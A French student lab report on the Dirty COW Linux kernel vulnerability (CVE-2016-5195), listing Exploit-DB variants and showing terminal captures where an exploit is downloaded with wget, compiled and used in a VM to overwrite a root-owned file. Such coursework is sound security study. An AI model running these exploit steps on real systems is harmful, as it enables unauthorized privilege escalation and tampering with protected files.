<style>
@page {
  margin: 0.6cm;
}

body {
  font-family: Arial, sans-serif;
  font-size: 12pt;
  line-height: 1.05;
  margin: 0;
  padding: 0;
}

h1 {
  font-size: 17pt;
  margin: 4px 0 8px 0;
}

h2 {
  font-size: 14pt;
  margin: 8px 0 5px 0;
}

h3 {
  font-size: 12pt;
  margin: 6px 0 4px 0;
}

p {
  font-size: 12pt;
  margin-top: 0;
  margin-bottom: 8px;
}

ul, ol {
  margin-top: 3px;
  margin-bottom: 6px;
  padding-left: 22px;
}

li {
  font-size: 12pt;
  margin-bottom: 2px;
}

pre, code {
  font-size: 9pt;
}
</style>



# Exercice — Dirty COW

**Auteur:** Amine Khelfi, Anthony Ledda, Shashkov Mikhail
**Date :** 04.10.2026

## 1. Identifier la CVE de Dirty COW

**Nom :** Dirty COW  
**Identifiant :** CVE-2016-5195  
**Type :** race condition dans le noyau Linux  
**Impact :** élévation locale de privilèges.  
**URL de la CVE :** [https://nvd.nist.gov/vuln/detail/CVE-2016-5195](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) (fiche MITRE : [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5195))


## 2. Trouvez les exploits disponibles sur exploit-db

Voici les variantes:

| ID Exploit-DB | Technique ou cible | Description générale |
|---|---|---|
| EDB-40611 | `/proc/self/mem` | Vise l’écriture dans un fichier protégé. |
| EDB-40616 | `/proc/self/mem`, SUID | Permet l’élévation locale de privilèges. |
| EDB-40838 | `PTRACE_POKEDATA` | Utilise l’interface `ptrace` pour tenter une écriture. |
| EDB-40839 | `PTRACE_POKEDATA`, `/etc/passwd` | Ciblant le fichier des comptes locaux. |
| EDB-40847 | `/proc/self/mem`, `/etc/passwd` | Utilise l’accès à la mémoire du processus pour cibler `/etc/passwd`. |

**Liens vers les fiches Exploit-DB :**

- [EDB-40611](https://www.exploit-db.com/exploits/40611)
- [EDB-40616](https://www.exploit-db.com/exploits/40616)
- [EDB-40838](https://www.exploit-db.com/exploits/40838)
- [EDB-40839](https://www.exploit-db.com/exploits/40839)
- [EDB-40847](https://www.exploit-db.com/exploits/40847)

## 3. Démontrez un exploit dans une VM

**Capture 1 — Préparation de la cible.** On vérifie que le noyau est vulnérable (`4.4.0-21-generic`) et qu'on est un utilisateur non privilégié (`uid=1000`). On crée ensuite un fichier `/tmp/dirtycow-test` appartenant à `root` en lecture seule pour les autres (`-rw-r--r--`). La tentative d'écriture en tant qu'utilisateur normal est bien refusée (`Permission denied`).

```bash
amine@ubuntu:~$ uname -r
4.4.0-21-generic
amine@ubuntu:~$ id
uid=1000(amine) gid=1000(amine) groups=1000(amine),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
amine@ubuntu:~$ sudo sh -c 'echo "ORIGINAL" > /tmp/dirtycow-test'
hmod 644 /tmp/diamine@ubuntu:~$ sudo chown root:root /tmp/dirtycow-test
amine@ubuntu:~$ sudo chmod 644 /tmp/dirtycow-test
amine@ubuntu:~$
amine@ubuntu:~$ ls -l /tmp/dirtycow-test
-rw-r--r-- 1 root root 9 Oct  3 11:35 /tmp/dirtycow-test
amine@ubuntu:~$ cat /tmp/dirtycow-test
ORIGINAL
amine@ubuntu:~$ echo "TEST NORMAL" >> /tmp/dirtycow-test
-bash: /tmp/dirtycow-test: Permission denied
amine@ubuntu:~$ cat /tmp/dirtycow-test
ORIGINAL
amine@ubuntu:~$
```
**Capture 2 — Création et exécution de l'exploit.** On télécharge le code source de l'exploit EDB-40611 depuis Exploit-DB (`wget`), puis on le compile. On lance ensuite le binaire en lui passant le fichier cible et la chaîne à écrire.. Malgré nos droits limités, le contenu du fichier `root` est bien modifié. Ecriture réussite :)

```bash 
amine@ubuntu:~$ mkdir -p ~/dirtycow
amine@ubuntu:~$ cd ~/dirtycow
amine@ubuntu:~/dirtycow$
amine@ubuntu:~/dirtycow$ wget https://www.exploit-db.com/download/40611 -O dirtycow.c
--2026-10-03 11:39:28--  https://www.exploit-db.com/download/40611
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2938 (2.9K) [application/txt]
Saving to: ‘dirtycow.c’
dirtycow.c         100%[================>]   2.87K  --.-KB/s    in 0s
2026-10-03 11:39:28 (1.00 GB/s) - ‘dirtycow.c’ saved [2938/2938]
amine@ubuntu:~/dirtycow$ ls
dirtycow  dirtycow.c
amine@ubuntu:~/dirtycow$ gcc -pthread dirtycow.c -o dirtycow
amine@ubuntu:~/dirtycow$ clear
amine@ubuntu:~/dirtycow$ cd ..
amine@ubuntu:~$ mkdir -p ~/dirtycow
amine@ubuntu:~$ cd ~/dirtycow
amine@ubuntu:~/dirtycow$ wget https://www.exploit-db.com/download/40611 -O dirtycow.c
--2026-10-03 11:39:59--  https://www.exploit-db.com/download/40611
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2938 (2.9K) [application/txt]
Saving to: ‘dirtycow.c’

dirtycow.c         100%[================>]   2.87K  --.-KB/s    in 0s

2026-10-03 11:39:59 (941 MB/s) - ‘dirtycow.c’ saved [2938/2938]

amine@ubuntu:~/dirtycow$ gcc -pthread dirtycow.c -o dirtycow
amine@ubuntu:~/dirtycow$ ls -l dirtycow
-rwxrwxr-x 1 amine amine 7984 Oct  3 11:40 dirtycow
amine@ubuntu:~/dirtycow$ ./dirtycow /tmp/dirtycow-test "CHANGES. "
mmap b778f000

amine@ubuntu:~/dirtycow$ cat /tmp/dirtycow-test
CHANGES. 
```
